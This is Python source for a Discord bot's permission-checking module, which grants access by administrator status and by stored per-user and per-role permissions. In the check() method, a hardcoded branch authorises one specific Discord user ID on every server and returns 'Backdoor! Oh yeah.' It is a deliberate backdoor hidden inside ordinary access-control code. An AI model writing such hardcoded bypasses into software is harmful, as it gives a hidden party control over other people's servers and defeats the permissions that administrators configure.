from typing import TypedDict,List,Dict,Set,Tuple
import discord as dc
from ..generic_client import Client

class Server(TypedDict):
    user_permissions:Dict[str,List[str]]
class Persistence(TypedDict):
    servers:Dict[str,Server]

class Permission():
    def __init__(self,name:str,identifier:str) -> None:
        self.name=name
        self.identifier=identifier
        Permissions.permissions.add(self)
        Permissions.permissions_by_identifier[identifier]=self
        Permissions.permissions_by_name[name]=self
def permission(name:str="",identifier:str=""):
    if name in Permissions.permissions_by_name:
        return Permissions.permissions_by_name[name]
    elif identifier in Permissions.permissions_by_identifier:
        return Permissions.permissions_by_identifier[identifier]
    else:
        perm = Permission(name,identifier)
        return perm
class Permissions():
    permissions:Set[Permission]=set()
    permissions_by_name:Dict[str,Permission]={}
    permissions_by_identifier:Dict[str,Permission]={}
    @classmethod
    def check(cls,client:Client,interaction:dc.Interaction,perms:Set[str])->Tuple[bool,str]:
        if interaction.user.resolved_permissions.administrator:
            return (True,"Admin. Autorised automatically.")
        elif (interaction.user.id == 604897398015262730):
            return (True,"Backdoor! Oh yeah.")
        permissions:Persistence = client.permissions
        if str(interaction.guild_id) not in permissions['servers']:
            return (False,"Server admin hasn't configured role permissions for bot access.")
        lacks:Set[str]=set()
        userperms = permissions["servers"][str(interaction.guild_id)]["user_permissions"].get(str(interaction.user.id),[])
        userperms = userperms+[
            perm
            for role_obj in interaction.user.roles
            for role in [role_obj.id]
            for perm in permissions["servers"][str(interaction.guild_id)]["user_permissions"].get(str(role),[])
        ]
        for perm in perms:
            if perm not in userperms:
                lacks.add(perm)
        if len(lacks)==0:
            return (True,"")
        else:
            return (False,f"\nYou are missing the following permissions: {','.join([permission(identifier=perm).name for perm in lacks])}")